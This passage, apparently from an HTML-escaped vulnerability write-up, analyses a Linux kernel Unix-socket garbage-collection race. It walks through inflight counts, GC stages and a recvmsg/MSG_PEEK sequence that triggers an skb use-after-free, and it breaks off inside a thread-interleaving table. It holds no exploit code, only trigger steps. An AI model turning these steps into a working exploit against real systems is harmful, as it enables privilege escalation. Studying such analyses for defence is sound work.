c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;2&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;2&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"c50 c19 c49 c42\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;2&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;2&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"c13 c19 c15\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;3&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 1, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;3&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"c50 c19 c49 c42\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 1, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;ref&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 1&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;If the garbage collection process happens now, the kernel will do the following scrutiny:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c27 lst-kix_h1p96gz9lzq4-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;List &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;3&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;as garbage candidates. Decrease inflight count for the candidate children in each receive queue.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Since &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;2&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not considered a candidate, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;s inflight count is still above zero.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Recursively restore the inflight count.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Nothing is considered garbage.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;A potential skb UAF by race condition can be triggered by:&lt;/span&gt;&lt;/p&gt;&lt;ol class=\"c27 lst-kix_j5vmamheymgq-0 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Call &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;with &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;2&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span&gt;Call &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;with &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c25 li-bullet-0\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Concurrently do the following operations:&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;ol class=\"c27 lst-kix_j5vmamheymgq-1 start\" start=\"1\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c21 c20 li-bullet-0\"&gt;&lt;span&gt;Call &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;without &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;&amp;rsquo;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c12 c20 c21 li-bullet-0\"&gt;&lt;span&gt;Call &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;with &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;How is it possible? Let&amp;rsquo;s see a case where the race condition is not hit so there is no UAF:&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.b47553220f0960b2834e887266a030fb4dc49b24\"&gt;&lt;/a&gt;&lt;a id=\"t.17\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Thread 0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Thread 1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Thread 2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Call unix_gc&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Stage0: List &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;, &amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;3&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;#x1d6fc;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;as garbage candidates.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Call &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;with &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;2&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Increase reference count: &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;scm.fp = scm_fp_dup(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;UNIXCB&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;(skb).fp);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Stage0: decrease inflight count from the child of every garbage candidate&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Status after stage 0:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 1&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;3&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;) = 0&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;(&amp;#x1d6fc;) = 0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Stage1: Recursively restore inflight count if a candidate still has inflight count. &lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Stage1: All inflight counts have been restored.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Stage2: No garbage, return.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Call &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;with &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span 